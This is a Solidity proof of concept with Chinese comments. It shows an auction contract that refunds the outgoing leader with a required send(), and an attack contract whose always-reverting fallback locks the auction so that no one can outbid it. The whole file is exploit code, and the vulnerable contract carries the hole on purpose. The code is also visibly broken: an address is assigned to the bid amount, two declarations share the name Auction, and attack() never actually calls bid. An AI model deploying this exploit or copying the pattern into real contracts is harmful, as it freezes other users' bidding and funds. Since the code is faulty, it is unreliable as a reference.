contract Auction {
    address public currentLeader;
    uint256 public highestBid;

    function bid() public payable{  //竞选方法
        require(msg.value >  highestBid); //判断当前投入eth是否大于之前的最大值
        require(currentLeader.send(highestBid));//如果大于 把原有的王位拥有者的金钱退回
        currentLeader =msg.sender; //当选新的国王
        highestBid =currentLeader;
    }
}

interface Auction{  //定义原有接口 方便调用
    function bid() external payable;
}
contract POC{  //定义攻击合约
    address owner;
    Auction auInstance;
    constructor() public{
        owner =msg.sender;
    }
    modifier onlyOwner(){
        require(owner == msg.sender);
        _;
    }
    function setInstance(address addr) public onlyOwner{  //实例化指定合约
        auInstance =Auction(addr);
    }
    function attack() public onlyOwner{ //攻击方法
        auInstance.bid.value(msg.value);
    }
    function () external payable{ //合约默认回调
        revert();
    }
}